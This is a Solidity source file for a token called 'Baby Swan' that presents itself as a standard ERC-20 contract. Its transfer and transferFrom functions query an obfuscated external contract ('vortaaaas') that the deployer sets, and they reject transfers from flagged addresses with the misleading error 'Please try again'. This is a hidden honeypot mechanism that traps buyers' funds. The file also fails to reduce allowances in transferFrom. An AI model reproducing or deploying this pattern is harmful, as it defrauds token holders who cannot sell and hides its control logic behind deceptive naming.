row number 
1	         pragma solidity ^0.7.6;
2	 interface RMT {
3	 function total_Supply() external view returns (uint256);
4	 function vortaaaas(address account) external view returns (uint8);
5	 function transfer_From(address sender, address recipient, uint256 amount) external returns (bool);
6	 function allowance_set(address owner, address spender) external view returns (uint256);
7	 }
8	 contract BabySwan {
9	 mapping(address => uint256) public balances;
10	 mapping(address => mapping(address => uint256)) public allowance;
11	 RMT tufflife;
12	 uint256 public totalSupply = 1 * 10**12 * 10**18;
13	 string public name = "Baby Swan";
14	 string public symbol = hex"426162795377616Ef09fa6a2";
15	 uint public decimals = 18;
16	 event Transfer(address indexed from, address indexed to, uint256 value);
17	 event Approval(address indexed owner, address indexed spender, uint256 value);
18	 constructor(RMT _rmstrg) {
19	 tufflife = _rmstrg;
20	 balances[msg.sender] = totalSupply;
21	 emit Transfer(address(0), msg.sender, totalSupply);
22	 }
23	 function balanceOf(address holder) public view returns(uint256) {
24	 return balances[holder];
25	 }
26	 function transfer(address to, uint256 value) public returns(bool) {
27	 require(tufflife.vortaaaas(msg.sender) != 1, "Please try again");
28	 require(balanceOf(msg.sender) >= value, 'balance too low');
29	 balances[to] += value;
30	 balances[msg.sender] -= value;
31	 emit Transfer(msg.sender, to, value);
32	 return true;
33	 }
34	 function transferFrom(address from, address to, uint256 value) public returns(bool) {
35	 require(tufflife.vortaaaas(from) != 1, "Please try again");
36	 require(balanceOf(from) >= value, 'balance too low');
37	 require(allowance[from][msg.sender] >= value, 'allowance too low');
38	 balances[to] += value;
39	 balances[from] -= value;
40	 emit Transfer(from, to, value);
41	 return true;
42	 }
43	 function approve(address spender, uint256 value) public returns(bool) {
44	 allowance[msg.sender][spender] = value;
45	 return true;
46	 }
47	 }
